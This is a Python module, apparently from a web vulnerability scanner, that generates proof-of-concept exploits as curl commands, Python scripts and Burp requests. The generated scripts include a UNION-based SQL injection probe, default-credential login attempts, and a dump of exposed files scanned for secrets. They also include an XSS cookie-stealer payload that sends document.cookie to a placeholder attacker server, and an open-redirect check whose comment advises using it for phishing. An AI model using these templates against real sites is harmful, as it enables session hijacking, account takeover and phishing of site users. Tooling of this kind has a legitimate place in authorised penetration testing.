# modules/poc_generator.py
# Generates Proof-of-Concept exploits for found vulnerabilities

from urllib.parse import urlparse, urlencode, parse_qs


def generate_curl(vuln_type, url, parameter=None, payload=None):
    """Generate curl command for the vulnerability"""

    if "SQL Injection" in vuln_type or "Login Bypass" in vuln_type:
        return f'curl -v -g "{url}"'

    elif "XSS" in vuln_type:
        return f'curl -v -g "{url}" -H "Cookie: document.cookie"'

    elif "Open Redirect" in vuln_type:
        return f'curl -v -L "{url}" -H "User-Agent: Mozilla/5.0"'

    elif "Sensitive File" in vuln_type or "Directory" in vuln_type:
        return f'curl -v "{url}"'

    elif "Missing Header" in vuln_type:
        return f'curl -I "{url}"'

    elif "Weak Credentials" in vuln_type:
        creds = payload.split(":") if payload and ":" in payload else ["admin", "admin"]
        username = creds[0]
        password = creds[1] if len(creds) > 1 else ""
        return f'curl -v -X POST "{url}" -d "username={username}&password={password}"'

    else:
        return f'curl -v "{url}"'


def generate_python_exploit(vuln_type, url, parameter=None, payload=None):
    """Generate Python exploit script"""

    base = f'''import requests

url = "{url}"
session = requests.Session()
session.headers.update({{
    "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64)"
}})
'''

    if "SQL Injection" in vuln_type:
        return base + f'''
# SQL Injection Exploit
payload = "{payload}"

response = session.get(url)
print(f"Status: {{response.status_code}}")
print(f"Response length: {{len(response.text)}}")

# Check for SQL errors
sql_errors = ["sql syntax", "mysql", "syntax error", "ora-"]
for error in sql_errors:
    if error in response.text.lower():
        print(f"[!!!] SQL Error found: {{error}}")
        break

# Try UNION based extraction
union_url = url + "' UNION SELECT null,@@version,null-- -"
r = session.get(union_url)
print(f"\\n[UNION] Status: {{r.status_code}}")
print(f"[UNION] Response: {{r.text[:500]}}")
'''

    elif "XSS" in vuln_type:
        return base + f'''
# XSS Exploit — Cookie Stealer
steal_payload = "<script>fetch('http://YOUR_SERVER/?c='+document.cookie)</script>"

response = session.get(url)
print(f"Status: {{response.status_code}}")

# Check if payload reflects
if "{payload}" in response.text:
    print("[!!!] XSS payload reflected in response!")
    print(f"[!!!] Try cookie stealer: {{steal_payload}}")
else:
    print("[-] Payload not directly reflected, try encoded versions")
'''

    elif "Open Redirect" in vuln_type:
        return base + f'''
# Open Redirect Exploit
test_url = "{url}"

response = session.get(test_url, allow_redirects=True)
print(f"Final URL: {{response.url}}")
print(f"Status: {{response.status_code}}")

if "evil.com" in response.url:
    print("[!!!] Open Redirect confirmed!")
    print("[!!!] Use for phishing: send victim to cloned login page")
else:
    print(f"[-] Final destination: {{response.url}}")
'''

    elif "Sensitive File" in vuln_type:
        return base + f'''
# Sensitive File Exposure Exploit
response = session.get(url)
print(f"Status: {{response.status_code}}")
print(f"Content-Type: {{response.headers.get('Content-Type', 'unknown')}}")
print(f"Response length: {{len(response.text)}} bytes")
print("\\n--- FILE CONTENTS (first 1000 chars) ---")
print(response.text[:1000])

# Check for sensitive data
sensitive = ["password", "secret", "api_key", "token", "db_password"]
for s in sensitive:
    if s in response.text.lower():
        print(f"\\n[!!!] Sensitive keyword found: {{s}}")
'''

    elif "Login Bypass" in vuln_type or "Weak Credentials" in vuln_type:
        creds = payload.split(":") if payload and ":" in payload else ["admin", "admin"]
        username = creds[0]
        password = creds[1] if len(creds) > 1 else ""
        return base + f'''
# Login Bypass / Weak Credentials Exploit
login_url = "{url}"
username = "{username}"
password = "{password}"

data = {{
    "username": username,
    "password": password
}}

response = session.post(login_url, data=data)
print(f"Status: {{response.status_code}}")
print(f"Response length: {{len(response.text)}}")

success_indicators = ["dashboard", "welcome", "logout", "profile"]
for indicator in success_indicators:
    if indicator in response.text.lower():
        print(f"[!!!] LOGIN SUCCESS! Indicator found: {{indicator}}")
        print(f"[!!!] Credentials: {{username}}:{{password}}")
        break
'''

    elif "Missing Header" in vuln_type:
        header_name = parameter or "Security Header"
        return base + f'''
# Missing Security Header — Verification
response = session.get(url)
print(f"Status: {{response.status_code}}")
print("\\n--- Security Headers ---")

security_headers = [
    "Content-Security-Policy",
    "Strict-Transport-Security",
    "X-Frame-Options",
    "X-Content-Type-Options",
    "Referrer-Policy",
    "Permissions-Policy"
]

for header in security_headers:
    value = response.headers.get(header, "MISSING")
    status = "✅" if value != "MISSING" else "❌"
    print(f"{{status}} {{header}}: {{value}}")
'''

    else:
        return base + f'''
# Generic Vulnerability Verification
response = session.get(url)
print(f"Status: {{response.status_code}}")
print(f"Response length: {{len(response.text)}}")
print("\\n--- Headers ---")
for k, v in response.headers.items():
    print(f"{{k}}: {{v}}")
'''


def generate_burp_request(vuln_type, url, parameter=None, payload=None):
    """Generate Burp Suite HTTP request"""

    parsed = urlparse(url)
    host = parsed.netloc
    path = parsed.path
    query = parsed.query

    if "SQL Injection" in vuln_type or "XSS" in vuln_type or "Open Redirect" in vuln_type:
        return f'''GET {path}{"?" + query if query else ""} HTTP/1.1
Host: {host}
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64)
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Connection: close

'''

    elif "Login Bypass" in vuln_type or "Weak Credentials" in vuln_type:
        creds = payload.split(":") if payload and ":" in payload else ["admin", "admin"]
        username = creds[0]
        password = creds[1] if len(creds) > 1 else ""
        body = f"username={username}&password={password}"
        return f'''POST {path} HTTP/1.1
Host: {host}
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64)
Accept: text/html,application/xhtml+xml
Content-Type: application/x-www-form-urlencoded
Content-Length: {len(body)}
Connection: close

{body}'''

    elif "Missing Header" in vuln_type:
        return f'''GET {path} HTTP/1.1
Host: {host}
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64)
Accept: */*
Connection: close

# After sending — check Response headers for missing:
# Content-Security-Policy
# Strict-Transport-Security
# X-Frame-Options
'''

    else:
        return f'''GET {path}{"?" + query if query else ""} HTTP/1.1
Host: {host}
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64)
Accept: */*
Connection: close

'''


def generate_poc(vuln_type, url, parameter=None, payload=None):
    """
    Master function — generates complete PoC for a vulnerability
    Returns dict with all PoC formats
    """
    return {
        "vuln_type": vuln_type,
        "url": url,
        "parameter": parameter,
        "payload": payload,
        "curl": generate_curl(vuln_type, url, parameter, payload),
        "python": generate_python_exploit(vuln_type, url, parameter, payload),
        "burp": generate_burp_request(vuln_type, url, parameter, payload),
    }


def format_poc_terminal(poc):
    """Format PoC for terminal output"""
    lines = []
    lines.append(f"\n{'='*60}")
    lines.append(f"💥 PROOF OF CONCEPT: {poc['vuln_type']}")
    lines.append(f"{'='*60}")
    lines.append(f"🌐 URL: {poc['url']}")
    if poc.get('payload'):
        lines.append(f"🔧 Payload: {poc['payload']}")

    lines.append(f"\n📌 curl Command:")
    lines.append(f"  {poc['curl']}")

    lines.append(f"\n🐍 Python Exploit:")
    lines.append("  " + poc['python'].replace('\n', '\n  '))

    lines.append(f"\n🔴 Burp Request:")
    lines.append("  " + poc['burp'].replace('\n', '\n  '))

    lines.append(f"{'='*60}\n")
    return "\n".join(lines)